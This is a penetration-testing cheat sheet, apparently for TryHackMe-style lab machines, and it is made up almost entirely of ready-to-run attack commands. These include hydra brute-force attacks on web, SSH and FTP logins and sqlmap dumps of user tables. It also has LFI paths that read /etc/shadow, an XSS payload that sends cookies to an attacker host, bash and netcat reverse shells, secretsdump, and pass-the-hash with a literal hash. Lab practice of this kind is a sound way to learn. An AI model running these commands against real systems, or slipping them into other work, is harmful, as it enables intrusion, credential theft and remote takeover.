# Cheat Sheet

## Enumeration

sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.1.109 --rate=1000 (quick open port scan)

nmap -sV -v -Pn -n -p8000,9300,22,5601,1111,9200 10.10.1.109 (then scan the ports found with masscan)

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.119.138 (enum samba shares)

nmap -sV -p- 10.10.10.10 (service scan)

nmap -A -T4 --script vuln -p- 10.10.10.10 (full scan)

nmap -sV -vv --script vuln 10.10.10.10 (vuln scan)
  
nmap -O 10.10.10.10 (operating system scan) 

nikto -host 10.10.200.161 (web scan)

enum4linux -a 10.10.26.102 | tee enum4linuxOutput.log

wpscan --url blog.thm --enumerate u

## Linux

cat /etc/passwd (get list of users)

sudo cat /etc/shadow (hash of password)

find / -type f -perm -o+w 2>/dev/null (find files with write permissions)

## msfconsole

db_nmap -sV BOX-IP

use shell_to_meterpreter

set payload payload/linux/x86/meterpreter/reverse_tcp

run post/multi/recon/local_exploit_suggester

load kiwi (creds_all)

***spawn shell from meterpreter***

shell

script -qc /bin/bash /dev/null 

## FTP

scp linpeas.sh jan@10.10.122.69:/dev/shm

## mysql 

mysql -h 10.10.28.115 -u(root) -p(ff912ABD*)

show databases;

use data;

select * from USERS;

## sql injection

sqlmap -u 10.10.115.80/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --batch

sqlmap -u 10.10.87.14/register.php --data "log_email=test&log_password=test&login_button=Login" --method POST -p "log_email,log_password" --level=3 --dbms=mysql 5.02 --batch -D social --columns -T users --dump

## LFI

http://10.10.58.44/get-file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow

http://10.10.109.75/?view=php://filter/convert.base64-encode/resource=dog../../index

## mountd (mount NFS drive)

/sbin/showmount -e 10.10.10.10 

sudo mkdir /mnt/thm

mount 10.10.10.10:/opt/files /mnt/thm

sudo umount -f -l thm

## gobuster

gobuster dir -u http://ip:port -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30

gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 

## crack passwords

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" (web login portal password)

hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.67.83 -t 4 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=incorrect" (wordpress)

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh

hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.120.174 -t 4 -s 4567 ssh (ssh port 4567)

hydra -l Queen -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ftp

fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./christmaslists.zip (zip password)

hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt --force (crack hash)

hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force (crack hash md5)

| hashid        | hashcat |
|---------------|---------|
| SHA-512 Crypt | 1800    |
|               |         |
|               |         |

## Encryption

pg -d note1.txt.gpg (decrypt gpg)

steghide extract -sf ./TryHackMe.jpg (stenography)

stegcracker aa.jpg

exiftool ./tryHackMe.jpg

/home/kali/.local/bin/stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt

crack zip password

```
/usr/sbin/zip2john 8702.zip > output
sudo john output
```

binwalk cutie.png

binwalk cutie.png -e (extract hidden files)

gpg decrypt > then enter password

```
gpg helmet_key.txt.gpg
```

openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt (asymmetric decryption using private key) 

## cmd to start reverse shell 

bash -i >& /dev/tcp/10.4.9.144/1234 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.144 1234 >/tmp/f

## listen for reverse shell

netcat -lvnp 1234 (or nc)

upgrade shell
```
python -c "import pty; pty.spawn('/bin/bash')"

control+z

stty raw -echo

fg

press enter a few times

export TERM=xterm
```
## XSS 

<script> new Image().src = "http://myIP:1234/stolencookie.php?cookie="+document.cookie;</script> (payload)

ncat -lkvnp 1234 (listen to payload)

# privilege escalation using SUID

find / -user root -perm -4000 2>> /dev/null (find SUID files)

## ssh with private key

/usr/share/john/ssh2john.py key > forjohn

/usr/sbin/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt

chmod 600 key

ssh -i key kay@10.10.122.69

## upload files to box

host on own computer
ls to directory

```
sudo python -m SimpleHTTPServer
```

get on box

```
wget http://10.4.9.144:8000/linpeas.sh
```

```
curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
```
## download files from box

on own machine
```
scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
```

## decode/encode

https://gchq.github.io/CyberChef/

## Active Directory

enumerate users - requires wordlist

```
./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
```

Which user account can you query a ticket from with no password?
```
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
```

enum shares - no password
```
smbclient -L 10.10.4.164 
```

enum shares - requires password
```
smbclient -L 10.10.4.164 --user svc-admin
```

connect to share - requires password
```
smbclient //10.10.4.164/backup --user svc-admin
```

dump all hashes - requires password
```
secretsdump.py backup@10.10.4.164 -just-dc
```

pass the hash 
```
evil-winrm -i 10.10.4.164 -u Administrator -H e4876a80a723612986d7609aa5ebc12b
```
## Assembly

start debug mode 

```
r2 -d <program>
```

search for main function 

```
s  main
```

view disassembly

```
pd
```

break point 

```
db <address value>
```

run until next break point
```
dc
```

print register values
```
dr <register>
```

# < details>

test
</details>
